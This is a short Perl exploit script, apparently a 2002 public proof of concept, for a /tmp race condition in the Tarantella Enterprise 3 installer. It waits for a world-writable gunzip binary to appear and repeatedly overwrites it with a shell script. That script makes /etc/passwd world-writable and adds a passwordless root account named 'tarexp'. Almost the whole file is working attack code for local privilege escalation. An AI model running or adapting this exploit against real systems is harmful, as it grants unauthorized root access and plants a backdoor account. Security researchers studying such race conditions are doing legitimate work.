#!/usr/bin/perl -w
#Another Exploit for tarantella enterprise 3 installation.
#Larry Cashdollar lwc@vapid.dhs.org 2/08/2002
#Exploits gunzip$$ binary being created in /tmp with perm 777
#http://online.securityfocus.com/bid/3966
#Experimental ext3 kernel mods for preventing/researching race conditions.
#http://vapid.dhs.org/tmp-patch-kernel-2.4.17.html

use strict;

`cat  <<  -EOF- > root.sh
#!/bin/sh
chmod 777 /etc/passwd
echo "tarexp::0:0:Tarantella Exploit:/:/bin/bash" >> /etc/passwd
-EOF-`;

my $OUT = '';

while(!$OUT) {
	$OUT =  `ps -ax |grep gunzip |grep -v grep`;
        print "Found $OUT\n";
}

my @args  = split(' ',$OUT);
# Do this with one copy operation. This will break installation of tarantella.
# should test for -w on /etc/passwd stop and su - tarexp.
while(1) {
`cp root.sh $args[4]`;
}
